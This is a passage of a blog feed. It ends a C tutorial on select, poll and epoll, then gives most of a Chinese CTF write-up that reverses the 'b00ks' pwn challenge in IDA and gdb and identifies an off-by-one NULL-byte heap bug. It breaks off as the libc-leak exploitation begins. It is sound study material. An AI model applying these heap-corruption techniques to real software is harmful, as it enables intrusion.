class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No data read within five seconds.\n&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    close(fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="Epoll-Example-with-File-I-O">Epoll Example with File I/O</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_EVENTS 5  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> fd = setup_file(<span class="string">&quot;example.txt&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> epoll_fd = epoll_create1(<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span> (epoll_fd == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;epoll_create1&quot;</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span>  </span><br><span class="line">    event.events = EPOLLIN;  </span><br><span class="line">    event.data.fd = fd;  </span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &amp;event) == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;epoll_ctl&quot;</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">MAX_EVENTS</span>];</span>  </span><br><span class="line">    <span class="type">int</span> n = epoll_wait(epoll_fd, events, MAX_EVENTS, <span class="number">5000</span>);  <span class="comment">// Wait for 5 seconds  </span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;epoll_wait&quot;</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (events[i].data.fd == fd) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;File is ready for reading.\n&quot;</span>);  </span><br><span class="line">            <span class="comment">// Read from the file  char buffer[1024];  </span></span><br><span class="line">            <span class="type">ssize_t</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer));  </span><br><span class="line">            <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Read %zd bytes: %.*s\n&quot;</span>, bytes_read, (<span class="type">int</span>)bytes_read, buffer);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    close(epoll_fd);  </span><br><span class="line">    close(fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="Explanation">Explanation</h3><ul><li>File Descriptor: Each example utilizes <code>setup_file</code> to open a file named <code>example.txt</code> in non-blocking mode. You need to ensure this file exists for these examples to work.</li><li>Select, Poll, Epoll: These functions check if the file is ready for reading within a 5-second window.</li><li>Reading from the File: Once data is available, the programs proceed to read it using <code>read()</code>.</li></ul><p>These examples demonstrate how non-blocking I/O operations can be handled for files using <code>select</code>, <code>poll</code>, and <code>epoll</code>, analogous to how they would be used for sockets.</p><h2 id="Does-Select-Map-File-Contents-to-Memory">Does Select Map File Contents to Memory?</h2><ul><li>No Direct Mapping: The <code>select</code> system call itself does not map file contents to memory. Its purpose is strictly to monitor the readiness of file descriptors for I/O operations.</li><li>Content Access: It does not involve reading or writing file contents. Once <code>select</code> indicates that a file descriptor is ready, you still need to perform actual read or write operations on the file descriptor to access or modify content.</li></ul><p>For regular files opened with non-blocking flags, <code>select</code> can be used to check readiness, although it is most useful for scenarios where I/O operations may block, such as with network sockets or pipes. Regular file systems often support ready operations differently than sockets do, making non-blocking I/O and readiness a key concern for network and inter-process communications.</p>]]></content>
    
    
    <summary type="html">面向chatgpt学习吧</summary>
    
    
    
    
    <category term="talking big" scheme="https://cl0und.xyz/tags/talking-big/"/>
    
    <category term="python" scheme="https://cl0und.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>PWN 堆利用 off-by-one NULL byte - b00ks writeup</title>
    <link href="https://cl0und.xyz/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/"/>
    <id>https://cl0und.xyz/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/</id>
    <published>2024-08-11T13:02:28.000Z</published>
    <updated>2024-09-14T14:31:37.712Z</updated>
    
    <content type="html"><![CDATA[<p>最新刚开始学pwn，还不熟悉ida和gdb。此篇记录了off-by-one b00ks上这道题的复现，从ida/gdb使用到payload编写。文中有一些内存分布图片偷懒我没有自己画，引用自<a href="https://blog.csdn.net/qq_48466156/article/details/139691096">这篇文章</a>（写的很好）。侵删。</p><!-- more --><h2 id="基本信息检查">基本信息检查</h2><p><img src="image1.png" alt=""></p><p><img src="image2.png" alt=""></p><h2 id="程序入口点分析">程序入口点分析</h2><p>静态方法拿到程序入口</p><p><img src="image3.png" alt=""></p><p>动态方法</p><p><code>start</code></p><ul><li>功能：<code>start</code>命令用于加载程序并在程序的 <code>main</code> 函数的第一条语句之前设置一个临时断点。代码会执行到 <code>main</code> 函数启动之前，然后暂停，让你可以进行调试设置。</li><li>典型场景：<code>start</code>命令通常用于希望程序在还没有开始主要逻辑之前能暂停下来，让调试者有机会设置其他断点或检查初始状态。</li></ul><p><img src="image4.png" alt=""></p><p><img src="image5.png" alt=""></p><h2 id="入口指令恢复">入口指令恢复</h2><p><img src="image6.png" alt=""></p><p><img src="image7.png" alt=""></p><p>这里看到IDA有一个错误的反编译，它把代码搞成了数据，选中这一段用 <code>Undefine</code>（快捷键 <code>U</code>），它会取消对该区域的数据显示。</p><p><img src="image8.png" alt=""></p><p>在取消定义后，右键点击同一区域。选择 <code>Code</code>（快捷键 <code>C</code>），这将告诉 IDA Pro 重新识别该区域为代码。</p><p>右键点击选择 <code>Code</code> 或按 <code>C</code> 键，选force，重新将选中的区域转换为代码。</p><p><img src="image9.png" alt=""></p><h2 id="确定main函数">确定main函数</h2><p>根据LIBC_START_MAIN的函数原型我们可以知道，第一个参数是main函数的地址 -&gt; cs:11CFh</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 ./csu/libc-start.c</span></span><br><span class="line">STATIC <span class="type">int</span> <span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **</span></span><br><span class="line"><span class="params">           MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">          <span class="type">int</span> argc,</span></span><br><span class="line"><span class="params">          <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">          ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params">          __typeof (main) init,</span></span><br><span class="line"><span class="params">          <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">          <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">          <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure><p><img src="image10.png" alt=""></p><p>由此找到main函数</p><p>在光标位于 <code>011CF</code> 地址上时，按下快捷键 <code>N</code>，会弹出一个对话框。输入 <code>main</code> 并确认。</p><p><img src="image11.png" alt=""></p><h2 id="代码阅读与函数名恢复">代码阅读与函数名恢复</h2><p><img src="image12.png" alt=""></p><h3 id="banner-sub-A77">banner(sub_A77)</h3><p>我们一个一个来看，sub_A77输出banner信息，重命名为banner</p><p><img src="image13.png" alt=""></p><h3 id="edit-author-name-sub-B6D">edit_author_name(sub_B6D)</h3><p>需要用户输入author name，重命名为edit_author_name</p><p><img src="image14.png" alt=""></p><h3 id="create-book-sub-F55">create_book(sub_F55)</h3><p>sub_F55是在创建书，重命名为create book</p><p><img src="image15.png" alt=""></p><h3 id="delete-book-sub-BBD">delete_book(sub_BBD)</h3><p>sub_BBD是在删除书，重命名为delete_book</p><p><img src="image16.png" alt=""></p><h3 id="edit-book-sub-E17">edit_book(sub_E17)</h3><p>sub_E17在修改book, edit_book</p><p><img src="image17.png" alt=""></p><h3 id="list-book-sub-D1F">list_book(sub_D1F)</h3><p>在输出所有书籍信息, list_book</p><p><img src="image18.png" alt=""></p><h3 id="menu-sub-A89">menu(sub_A89)</h3><p>sub_A89给出了选项，根据用户不同输出跳转到上面的各个子功能。重命名为menu</p><p><img src="image19.png" alt=""></p><p>最后main被润色成如下</p><p><img src="image20.png" alt=""></p><h2 id="细读子功能-create-book">细读子功能 create_book</h2><p>用户先输入一个size，然后malloc指定用户输入的size的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">sub_F55</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp-24h] [rbp-24h]</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, &amp;v1);</span><br><span class="line">    v4 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_9F5(v4, v1 - <span class="number">1</span>) )</span><br></pre></td></tr></table></figure><p>接着调用sub_9F5，让我们细看一下sub_9F5的作用，这里它循环读取用户输入内容并且赋值给刚才malloc的那块内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">sub_9F5</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, v4, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重名为scan_user_input。举个例子如果用户输入32, 那么就会调用scan_user_input(v4, 31)。scan_user_input内部循环从0读到31并且在第32位添加0，注意这里其实是一个 <em>off</em> -by-<em>one NULL byte</em>问题，用户申请32的空间，实际写入了33个字符。</p><p>如果一切回继续进入else部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = sub_B24();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3[<span class="number">6</span>] = v1;</span><br><span class="line">      *((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">      *((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">      *((_QWORD *)v3 + <span class="number">1</span>) = v4;</span><br><span class="line">      *v3 = ++unk_202024;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用sub_B24</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">sub_B24</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  *((_DWORD *)&amp;v1 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( *((_DWORD *)&amp;v1 - <span class="number">1</span>) = <span class="number">0</span>; *((_DWORD *)&amp;v1 - <span class="number">1</span>) &lt;= <span class="number">19</span>; ++*((_DWORD *)&amp;v1 - <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)off_202010 + *((<span class="type">signed</span> <span class="type">int</span> *)&amp;v1 - <span class="number">1</span>)) )</span><br><span class="line">      <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1 - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合后面*((_QWORD *)off_202010 + v2) = v3分析，off_202010其实是一个数组（书柜）用来放置book对象的指针，循环遍历这个数字，如果数组对应下标为空，那么说明书柜有空位，返回对应下标，否则返回-1（-1的反码为0xFFFFFFFFLL）把sub_B24命名为check_space。</p><p>一旦有space就会给book对象malloc一个空间，稍微美化一下，容易看出在源码中book应该是一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">book = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book )</span><br><span class="line">&#123;</span><br><span class="line">  book[<span class="number">6</span>] = desc_size;</span><br><span class="line">  *((_QWORD *)bookshelf + idx) = book;</span><br><span class="line">  *((_QWORD *)book + <span class="number">2</span>) = book_desc;</span><br><span class="line">  *((_QWORD *)book + <span class="number">1</span>) = book_name;</span><br><span class="line">  *book = ++unk_202024;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br></pre></td></tr></table></figure><p>不过这里反编译的仍然很混乱，unk_202024应该是一个int, book + 1, book + 2应该是两个8字节的指针，为什么放size的时候突然发到book[6]了？book这里一个item的大小究竟是多少？</p><p>我们回到这部分汇编再看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000010F</span>A</span><br><span class="line">.text:<span class="number">00000000000010F</span>A loc_10FA:                               ; CODE XREF: create_book+<span class="number">18</span>D↑j</span><br><span class="line">.text:<span class="number">00000000000010F</span>A                 mov     edi, <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span>  ; size</span><br><span class="line">.text:<span class="number">00000000000010F</span>F                 call    _malloc</span><br><span class="line">.text:<span class="number">0000000000001104</span>                 mov     [rbp<span class="number">-18</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000001108</span>                 cmp     qword ptr [rbp<span class="number">-18</span>h], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000000110</span>D                 jnz     <span class="type">short</span> loc_1122</span><br><span class="line">.text:<span class="number">000000000000110F</span>                 lea     rdi, large cs:<span class="number">1618</span>h ; <span class="string">&quot;Unable to allocate book struct&quot;</span></span><br><span class="line">.text:<span class="number">0000000000001116</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000000111B</span>                 call    _printf</span><br><span class="line">.text:<span class="number">0000000000001120</span>                 jmp     <span class="type">short</span> loc_118F</span><br><span class="line">.text:<span class="number">0000000000001122</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: create_book+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp<span class="number">-20</span>h]      <span class="comment">//这里里面放的是desc size的值</span></span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax放置book对象指针地址</span></span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx     <span class="comment">//把edx赋值给book对象的第一个值，这个值是一个4字节的值</span></span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, bookshelf     <span class="comment">//把存放bookshelf数组地址的那个地址传入</span></span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]         <span class="comment">//拿到bookshelf数组的起始地址</span></span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp<span class="number">-1</span>Ch]     <span class="comment">//把idx放到edx里面</span></span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx           <span class="comment">//把idx字节的值保留符号扩展到8字节</span></span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span>             <span class="comment">//把idx右移动3位相当于idx * 8 -&gt; 移动到指针的距离</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax           <span class="comment">//rdx = bookshelf + idx * 8</span></span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax = book地址</span></span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax         <span class="comment">//[bookshelf + idx * 8] = book地址</span></span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax = book地址</span></span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp<span class="number">-8</span>]       <span class="comment">//这里放的是desc指针</span></span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx     <span class="comment">//[book+0x10] = desc指针</span></span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax放置book对象指针地址</span></span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp<span class="number">-10</span>h]     <span class="comment">//[rbp-10h]的值name的指针</span></span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx       <span class="comment">//[book + 0x8] = name的指针</span></span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024     <span class="comment">// rax = unk_202024</span></span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]          <span class="comment">// eax = [unk_202024]</span></span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]        <span class="comment">// edx = [unk_202024] + 1</span></span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024     <span class="comment">// rax = [unk_202024]</span></span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx          <span class="comment">// [unk_202024] = [unk_202024] + 1</span></span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024     <span class="comment">// rax = unk_202024</span></span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]          <span class="comment">// edx = [unk_202024]</span></span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp<span class="number">-18</span>h]      <span class="comment">// rax = book</span></span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx          <span class="comment">//*book = 4字节宽度的 unk_202024</span></span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span>             </span><br><span class="line">.text:<span class="number">000000000000118</span>D                 jmp     <span class="type">short</span> locret_11CD</span><br><span class="line">.text:<span class="number">000000000000118F</span> ; ----------------------------------------</span><br></pre></td></tr></table></figure><p>综上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">book + <span class="number">0x18</span>h = desc_szie</span><br><span class="line">book + <span class="number">0x8</span>h =  name指针</span><br><span class="line">book + <span class="number">0x10</span>h = desc 指针</span><br><span class="line">book + <span class="number">0x0</span>h = <span class="type">int</span> number</span><br></pre></td></tr></table></figure><p>可见ida的反汇编结果不太准确。book结构体正确的偏移应该是。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="number">-4</span> <span class="type">int</span></span><br><span class="line"><span class="number">8</span><span class="number">-16</span> ptr</span><br><span class="line"><span class="number">16</span><span class="number">-24</span> ptr</span><br><span class="line"><span class="number">24</span><span class="number">-28</span> <span class="type">int</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id; </span><br><span class="line">    <span class="type">char</span> *name; <span class="comment">//因为对齐会占到8</span></span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125; book;</span><br></pre></td></tr></table></figure><p>在ida中创建结构体</p><p><img src="image21.png" alt=""></p><p><img src="image22.png" alt=""></p><p><img src="image23.png" alt=""></p><p>这下就对味了, malloc完堆布局如下。</p><p><img src="image24.png" alt=""></p><h2 id="细说利用-泄漏libc地址">细说利用 (泄漏libc地址)</h2><p>bookshelf数组里面放着第一个book的指针 (0x0000555555603710)</p><p><img src="image25.png" alt=""></p><p>Bookshelf和off_202018(author name相邻)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202010 bookshelf       dq 